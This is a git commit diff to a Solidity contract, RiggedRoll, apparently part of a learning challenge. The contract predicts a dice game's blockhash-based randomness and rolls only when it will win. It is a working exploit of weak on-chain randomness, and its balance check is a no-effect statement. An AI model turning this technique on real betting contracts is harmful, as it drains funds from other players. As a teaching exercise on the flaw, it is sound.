7e9f517d148f488c30b1c6462538a11a6f1c673c
TheNuelgeek <thenuelgeekmain@gmail.com>
2022-08-17 23:26:36 +0100

    Working on Challenge test

--- packages/hardhat-ts/contracts/RiggedRoll.sol
+++ packages/hardhat-ts/contracts/RiggedRoll.sol
@@ -7,8 +7,7 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 
 contract RiggedRoll is Ownable {
   DiceGame public diceGame;
-  uint256 public nonce;
-  uint public rolled;
+  uint256 public rolled;
 
   constructor(address payable diceGameAddress) {
     diceGame = DiceGame(diceGameAddress);
@@ -20,19 +19,23 @@ contract RiggedRoll is Ownable {
   }
 
   //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
-  function riggedRoll(address d) public payable returns (uint256) {
+  function riggedRoll() public payable returns (uint256) {
     address(this).balance >= 0.002 ether;
     bytes32 prevHash = blockhash(block.number - 1);
-    bytes32 hash = keccak256(abi.encodePacked(prevHash, d, diceGame.nonce));
+    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
     uint256 roll = uint256(hash) % 16;
 
-    nonce++;
-    // require(roll <= 2, 'Prediction Incorrect');
     //2000000000000000
-    bool side = roll <= 2 ? true : false;
-    diceGame.rollTheDice();
+    console.log('The Roll is', roll);
+
+    if (roll <= 2) {
+      diceGame.rollTheDice{value: 0.002 ether}();
+    } else {
+      revert('Wrong Roll Guess');
+    }
+
     return rolled = roll;
-    console.log(roll);
+    // console.log(roll);
   }
 
   //Add receive() function so contract can receive Eth
